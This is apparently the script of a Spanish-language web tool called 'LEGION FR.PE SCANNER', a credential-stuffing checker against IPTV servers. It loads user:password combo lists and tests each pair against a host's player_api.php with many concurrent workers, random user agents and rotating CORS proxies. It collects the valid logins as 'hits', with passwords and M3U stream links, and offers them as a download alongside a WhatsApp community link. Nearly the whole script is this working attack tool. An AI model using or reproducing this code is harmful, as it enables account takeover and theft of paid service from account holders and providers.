            const canvas = document.getElementById('matrixCanvas');
            const ctx = canvas.getContext('2d');

            const fontSize = 16;
            let drops = [];
            const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz$#@%&*()!?';
            const charArray = chars.split('');

            function resizeCanvas() {
                width = canvas.width = window.innerWidth;
                height = canvas.height = window.innerHeight;
                columns = Math.floor(width / fontSize);
                drops = [];
                for (let i = 0; i < columns; i++) {
                    drops[i] = Math.floor(Math.random() * -100);
                }
            }

            function drawMatrix() {
                ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
                ctx.fillRect(0, 0, width, height);

                ctx.fillStyle = '#33ff99';
                ctx.font = fontSize + 'px monospace';

                for (let i = 0; i < drops.length; i++) {
                    const char = charArray[Math.floor(Math.random() * charArray.length)];
                    const x = i * fontSize;
                    const y = drops[i] * fontSize;

                    
                    const brightness = Math.random() * 0.5 + 0.3;
                    ctx.fillStyle = `rgba(51, 255, 153, ${brightness})`;
                    ctx.fillText(char, x, y);

                    if (y > height && Math.random() > 0.98) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }

            function animate() {
                drawMatrix();
                requestAnimationFrame(animate);
            }

            window.addEventListener('resize', resizeCanvas);
            resizeCanvas();
            animate();

            
            document.addEventListener('visibilitychange', () => {
                
            });

        function createSession() {
            return { headers: { "User-Agent": randomUA(), "Accept": "application/json, text/javascript,*/*;q=0.9" }, cookies: {} };
        }

        function attachCookies(opts, session) {
            const cstr = Object.entries(session.cookies || {}).map(([k, v]) => `${k}=${v}`).join("; ");
            if (cstr) { opts.headers = { ...(opts.headers || {}) };
                opts.headers.Cookie = cstr; }
            return opts;
        }

        function fetchTimeout(url, opts = {}, ms = 4000) {
            return new Promise((resolve, reject) => {
                const ctrl = new AbortController();
                const id = setTimeout(() => { ctrl.abort();
                    reject(new Error('timeout')); }, ms);
                fetch(url, { ...opts, signal: ctrl.signal })
                    .then(r => { clearTimeout(id);
                        resolve(r); })
                    .catch(e => { clearTimeout(id);
                        reject(e); });
            });
        }

        function proxyIsCold(tpl) {
            const s = proxyFailMap.get(tpl);
            return s && s.until && Date.now() < s.until;
        }

        function noteProxyFail(tpl) {
            let s = proxyFailMap.get(tpl) || { n: 0, until: 0 };
            s.n++;
            if (s.n >= PROXY_MAX_FAILS) { s.until = Date.now() + COOLDOWN;
                s.n = 0; }
            proxyFailMap.set(tpl, s);
        }

        function noteProxyOk(tpl) { proxyFailMap.delete(tpl); }

        async function fetchWithCors(url, options = {}) {
            const baseOpts = { cache: 'no-store', keepalive: false, ...options };
            if (jobProxy && !proxyIsCold(jobProxy)) {
                try {
                    const proxied = jobProxy.replace('{url}', encodeURIComponent(url));
                    const r = await fetchTimeout(proxied, baseOpts);
                    if (r.ok) { noteProxyOk(jobProxy); return r; }
                    noteProxyFail(jobProxy);
                } catch (e) { noteProxyFail(jobProxy); }
            }
            try {
                const r = await fetchTimeout(url, baseOpts);
                if (r.ok) return r;
            } catch (e) {}
            if (!useCorsCheck.checked) throw new Error('No cors');
            const pool = CORS_PROXIES.filter(t => t !== jobProxy && !proxyIsCold(t)).sort(() => Math.random() - 0.5);
            for (const tpl of pool) {
                try {
                    const proxied = tpl.replace('{url}', encodeURIComponent(url));
                    const r = await fetchTimeout(proxied, baseOpts);
                    if (r.ok) { noteProxyOk(tpl);
                        jobProxy = tpl; return r; }
                    noteProxyFail(tpl);
                } catch (e) { noteProxyFail(tpl); }
            }
            throw new Error('Fetch failed');
        }

        function extractCombo(line) {
            if (!line) return null;
            let s = String(line).normalize('NFKC').replace(/\s+/g, ' ').trim();
            const m = s.match(/([^:\s][^:\n\r]*)\s*:\s*([^:\s][^\n\r]*)/u);
            if (!m) return null;
            const user = m[1].trim(),
                pass = m[2].trim();
            if (!user || !pass) return null;
            return [user, pass];
        }

        async function getTotalCounts(host, user, pass, usedProto) {
            const baseUrl =
                `${usedProto}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
            const opts = { headers: { 'User-Agent': randomUA() } };
            try {
                const [liveResp, vodResp, seriesResp] = await Promise.allSettled([
                    fetchTimeout(`${baseUrl}&action=get_live_streams`, opts, 4000),
                    fetchTimeout(`${baseUrl}&action=get_vod_streams`, opts, 4000),
                    fetchTimeout(`${baseUrl}&action=get_series`, opts, 4000)
                ]);
                let channels = 0,
                    movies = 0,
                    series = 0;
                if (liveResp.status === 'fulfilled' && liveResp.value.ok) {
                    const data = await liveResp.value.json();
                    if (Array.isArray(data)) channels = data.length;
                }
                if (vodResp.status === 'fulfilled' && vodResp.value.ok) {
                    const data = await vodResp.value.json();
                    if (Array.isArray(data)) movies = data.length;
                }
                if (seriesResp.status === 'fulfilled' && seriesResp.value.ok) {
                    const data = await seriesResp.value.json();
                    if (Array.isArray(data)) series = data.length;
                }
                return { channels, movies, series };
            } catch (e) {
                return { channels: 0, movies: 0, series: 0 };
            }
        }

        async function validarCombo(host, combo, opts = {}, session = null, ui = null, nick = 'by:PERCY FR.PE') {
            if (stopRequested) return null;
            const pair = Array.isArray(combo) ? combo : extractCombo(combo);
            if (!pair) return null;
            const [user, pass] = pair;
            if (ui) ui.user.textContent = `👤 Usuario : ${user}:${pass}`;
            const protos = ['http://', 'https://'];
            let data = null,
                usedProto = 'http://';
            for (const p of protos) {
                const url =
                `${p}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
                try {
                    const res = await fetchWithCors(url, opts);
                    if (res.ok) {
                        data = await res.json();
                        usedProto = p;
                        break;
                    }
                } catch (e) {}
            }
            if (!data) return null;
            const uinfo = data.user_info || {};
            const ok = (uinfo.status === 'Active' || uinfo.status === 'Activo' || String(uinfo.auth) === '1' || uinfo
                .status === 'Actif');
            if (!ok) return null;

            const counts = await getTotalCounts(host, user, pass, usedProto);
            const [hostname, port] = host.includes(':') ? [host.split(':')[0], host.split(':')[1]] : [host, (usedProto ===
                    'https://' ? '443' : '80')];
            const linkM3u =
                `${usedProto}${host}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
            const geo = serverGeo || null;
            const pais = geo ? `${geo.country}` : 'Desconocido';
            return {
                user,
                pass,
                host,
                hostname,
                port,
                usedProto,
                uinfo,
                linkM3u,
                geo,
                pais,
                nick: nick || 'by:PERCY FR.PE',
                channels: counts.channels,
                movies: counts.movies,
                series: counts.series,
                total: counts.channels + counts.movies + counts.series
            };
        }

        function buildHitHTML(hitData) {
    const { user, pass, host, usedProto, uinfo, linkM3u, geo, pais, nick, channels, movies, series, total } = hitData;
    const created = uinfo.created_at ? new Date(uinfo.created_at * 1000).toLocaleDateString() : 'N/D';
    const expires = uinfo.exp_date ? new Date(uinfo.exp_date * 1000).toLocaleDateString() : 'N/D';
    const status = (uinfo.status === 'Active' || uinfo.status === 'Activo' || String(uinfo.auth) === '1') ? '✅ Active' : '❌ Inactive';
    const maxConns = uinfo.max_connections ?? uinfo.max_cons ?? 'N/D';
    const activeCons = uinfo.active_cons ?? uinfo.connected_cons ?? 'N/D';
    const ip = geo ? geo.ip : 'N/D';
    const paisEmoji = geo ? '📌' : '';

    return `


  𝐅𝐑.𝐏𝐄 𝐇𝐈𝐓            

║ 🧑‍🦱 Usuario: ${user}
║ 🔑 Contraseña: ${pass} 
║ 📡 Servidor: ${usedProto}${host}
║ ⏳ Creada El: ${created}                                     
║ ⌛ Expira El: ${expires}                                            
║ 📡 IP: ${ip}                                                                                                                                                                                                
║ 👥 Conexiones máximas: ${maxConns} │ Activas: ${activeCons}  
║ 🔗 Link M3U: ${linkM3u}                                                                                                   
║ 📜 Estado: ${status}                                                                                
║ 📌 País : ${paisEmoji} ${pais}                              
║ 👥 Comunidad:https://chat.whatsapp.com/FyyZzU5cU9x8Ndd5kT2rfF                                  
`;
}

        function mostrarHit(hitData) {
            const content = buildHitHTML(hitData);
            const div = document.createElement('div');
            div.className = 'hit-entry';
            div.textContent = content;
            hitsContainer.prepend(div);
            hits.push({ text: content, ...hitData });
            const count = hits.length;
            hitsCount.innerHTML = `📜 HITS: ${count}`;
            hitsCountSide.textContent = count;
        }

        function actualizarProgreso(escaneados, total) {
            const pct = total === 0 ? 0 : (escaneados / total) * 100;
            progressFill.style.width = pct + '%';
            progressPct.textContent = Math.round(pct) + '%';
            progressTextSpan.textContent = ` escaneados: ${escaneados} de ${total} | 📜 HITS: ${hits.length}`;
            const count = hits.length;
            hitsCount.innerHTML = `📜 HITS: ${count}`;
            hitsCountSide.textContent = count;
        }

        async function processarJob(host, combosArr, concurrency, nick) {
            if (!combosArr.length) return;
            const total = combosArr.length;
            let processed = 0;
            const sleep = ms => new Promise(r => setTimeout(r, ms));
            let index = 0;
            const worker = async () => {
                const session = createSession();
                while (index < total && !stopRequested) {
                    const i = index++;
                    if (i >= total) break;
                    const combo = combosArr[i];
                    if (!combo) continue;
                    currentComboSpan.textContent = `👤 Usuario: ${combo}`;
                    let opts = { headers: { ...session.headers } };
                    opts = attachCookies(opts, session);
                    try {
                        const hitData = await validarCombo(host, combo, opts, session, { user: currentComboSpan },
                            nick);
                        if (!stopRequested && hitData) mostrarHit(hitData);
                    } catch (e) {}
                    processed++;
                    actualizarProgreso(processed, total);
                    await sleep(5 + Math.random() * 20);
                    if (stopRequested) break;
                }
            };
            progressTextSpan.textContent = '🚨 Iniciando escaneo ,suerte...';
            const workers = Math.min(concurrency, total, 300);
            await Promise.all(Array.from({ length: workers }, () => worker()));
            currentComboSpan.textContent = '👤 Usuario: -';
            progressTextSpan.textContent += stopRequested ? ' | ⏹ Detenido.' : ' | 🎉 Fin.';
        }

       
        function downloadHits() {
            if (hits.length === 0) {
                alert('⚠️ No hay hits para descargar.');
                return;
            }

            try {
                const unique = new Map();
                for (const h of hits) {
                    if (!unique.has(h.text)) unique.set(h.text, h);
                }

                const header =
                    `\n    \n   TOTAL HITS: ${unique.size}  \n\n\n`;
                const content = Array.from(unique.values()).map(h => h.text).join('\n\n\n\n');
                const fullContent = header + content;

                const blob = new Blob([fullContent], { type: 'text/plain;charset=utf-8' });
                const hostRaw = hostInput.value.trim().replace(/[^a-zA-Z0-9]/g, '_') || 'servidor';
                const timestamp = new Date().toISOString().slice(0, 19).replace(/[:-]/g, '');
                const filename = `HITS_LEGION_FRPE_${hostRaw}_${timestamp}.txt`;
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = filename;
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                setTimeout(() => {
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                }, 5000);

                console.log(`📥 Descarga iniciada: ${filename} (${unique.size} hits)`);

            } catch (err) {
                console.error(`❌ Error al descargar: ${err.message}`);
                alert(`Error al descargar hits: ${err.message}`);
            }
        }

        
        function actualizarBotonInicio() {
            const hasHost = !!hostInput.value.trim();
            startBtn.disabled = !(hasHost && combosActuales.length > 0);
        }

        function fullReset() {
            if (isRunning) stopRequested = true;
            isRunning = false;
            stopRequested = false;
            hostInput.value = '';
            comboFile.value = '';
            combosActuales = [];
            hitsContainer.innerHTML = '';
            hits = [];
            progressFill.style.width = '0%';
            progressPct.textContent = '0%';
            progressTextSpan.textContent = 'Esperando...';
            currentComboSpan.textContent = '👤 Usuario: -';
            hitsCount.innerHTML = '📜 HITS: 0';
            hitsCountSide.textContent = '0';
            serverIP = null;
            serverGeo = null;
            actualizarBotonInicio();
        }

        function limpiarCombos() {
            if (isRunning) return;
            comboFile.value = '';
            combosActuales = [];
            hitsContainer.innerHTML = '';
            hits = [];
            progressFill.style.width = '0%';
            progressPct.textContent = '0%';
            progressTextSpan.textContent = 'Esperando...';
            currentComboSpan.textContent = '👤 Usuario: -';
            hitsCount.innerHTML = '📜 HITS: 0';
            hitsCountSide.textContent = '0';
            actualizarBotonInicio();
        }

        function cargarArchivo() { comboFile.click(); }

        function procesarArchivo() {
            const file = comboFile.files[0];
            if (!file) return;
            const reader = new FileReader();
            reader.onload = e => {
                const lines = e.target.result.split(/\r?\n/);
                const parsed = [];
                for (const line of lines) {
                    const p = extractCombo(line);
                    if (p) parsed.push(`${p[0]}:${p[1]}`);
                }
                if (parsed.length === 0) { alert('Archivo sin combos válidos.'); return; }
                combosActuales = parsed;
                actualizarBotonInicio();
            };
            reader.readAsText(file);
        }

        function populatePresets() {
           
            presetSelect.innerHTML = '<option value="">-- Selecciona servidor --</option>';

            UNIQUE_SERVERS.forEach(s => {
                const opt = document.createElement('option');
                opt.value = s;
                opt.textContent = s;
                presetSelect.appendChild(opt);
            });

            
            presetSelect.style.display = 'none';
            setTimeout(() => {
                presetSelect.style.display = 'block';
            }, 50);

            console.log('📡 Servidores cargados:', UNIQUE_SERVERS.length);

            presetSelect.addEventListener('change', function() {
                if (this.value) {
                    hostInput.value = this.value;
                    actualizarBotonInicio();
                }
            });

            
            presetSelect.addEventListener('touchstart', function() {
                
                this.focus();
            });
        }

        // ========== INICIO DEL ESCANEO ==========
        async function startScan() {
            if (isRunning) return;
            stopRequested = false;
            isRunning = true;
            startBtn.disabled = true;
            stopBtn.disabled = false;
            saveBtn.disabled = true;
            hitsContainer.innerHTML = '';
            hits = [];
            progressFill.style.width = '0%';
            progressPct.textContent = '0%';
            progressTextSpan.textContent = '🌐 Resolviendo IP...';
            currentComboSpan.textContent = '👤 Usuario: -';
            hitsCount.innerHTML = '📜 HITS: 0';
            hitsCountSide.textContent = '0';

            const rawHost = hostInput.value.trim();
            if (!rawHost) { alert('Ingresa un host');
                isRunning = false;
                startBtn.disabled = false;
                saveBtn.disabled = false; return; }
            const host = rawHost.replace(/^https?:\/\//, '');
            const conc = parseInt(concurrencyInput.value) || 120;
            const nick = 'LEGION FR.PE';

            const domainHost = host.split(':')[0];
            try {
                const resp = await fetch(`https://dns.google/resolve?name=${domainHost}&type=A`);
                if (resp.ok) {
                    const data = await resp.json();
                    const ip = data.Answer?.find(a => a.type === 1)?.data;
                    if (ip) {
                        serverIP = ip;
                        const geoResp = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city`);
                        if (geoResp.ok) {
                            const geo = await geoResp.json();
                            if (geo.status === 'success') serverGeo = { ip, country: geo.country, city: geo.city };
                        }
                    }
                }
            } catch (e) {}

            const shuffle = [...CORS_PROXIES].sort(() => Math.random() - 0.5);
            jobProxy = shuffle[0] || null;

            if (combosActuales.length === 0) {
                alert('No hay combos cargados.');
                isRunning = false;
                startBtn.disabled = false;
                saveBtn.disabled = false;
                return;
            }

            await processarJob(host, combosActuales, conc, nick);

            isRunning = false;
            stopBtn.disabled = true;
            startBtn.disabled = false;
            saveBtn.disabled = false;
        }

        // ========== EVENTOS ==========
        startBtn.addEventListener('click', startScan);
        stopBtn.addEventListener('click', () => { if (isRunning) stopRequested = true;
            stopBtn.disabled = true; });
        saveBtn.addEventListener('click', downloadHits);
        loadFileBtn.addEventListener('click', cargarArchivo);
        comboFile.addEventListener('change', procesarArchivo);
        clearAllBtn.addEventListener('click', fullReset);
        clearCombosBtn.addEventListener('click', limpiarCombos);
        hostInput.addEventListener('input', actualizarBotonInicio);

        
        populatePresets();

        actualizarBotonInicio();

        console.log('LEGION Fr.Pe · SCANNER ');
        console.log('📂 Los hits se guardan en: /sdcard/Download/Hits-LegionFrPe*.txt');

        
        setTimeout(() => {
            if (presetSelect.options.length <= 1) {
                console.log('⚠️ Reintentando cargar servidores...');
                populatePresets();
            }
        }, 500);
    </script>
